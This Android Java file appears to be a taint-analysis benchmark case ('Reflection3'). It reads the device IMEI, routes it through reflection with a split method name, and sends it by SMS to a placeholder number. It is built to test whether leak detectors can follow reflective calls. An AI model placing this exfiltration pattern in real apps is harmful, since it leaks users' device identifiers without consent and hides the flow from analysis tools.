package de.ecspride;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Reflection3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail steven.arzt@cased.de
 *
 * @description A class instance is created using reflection. Sensitive data is stored
 * 	using a setter in this class, read back using a getter and then leaked. No type information
 *  on the target class is used.
 * @dataflow onCreate: source -> o.setImei() -> o.getImei() -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to reflective invocations of methods without
 * 	type information on the target class.
 */
public class MainActivity extends Activity {

    @SuppressWarnings({ "unchecked", "rawtypes" })
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            // source
            String imei = telephonyManager.getDeviceId();
            Class c = Class.forName("de.ecspride.ReflectiveClass");
            Object o = c.newInstance();
            Method m = c.getMethod("setIme" + "i", String.class);
            m.invoke(o, imei);
            Method m2 = c.getMethod("getImei");
            String s = (String) m2.invoke(o);
            SmsManager sms = SmsManager.getDefault();
            // sink, leak
            sms.sendTextMessage("+49 1234", null, s, null, null);
        } catch (InstantiationException e) {
        } catch (IllegalAccessException e) {
        } catch (ClassNotFoundException e) {
        } catch (NoSuchMethodException e) {
        } catch (IllegalArgumentException e) {
        } catch (InvocationTargetException e) {
        }
    }
}
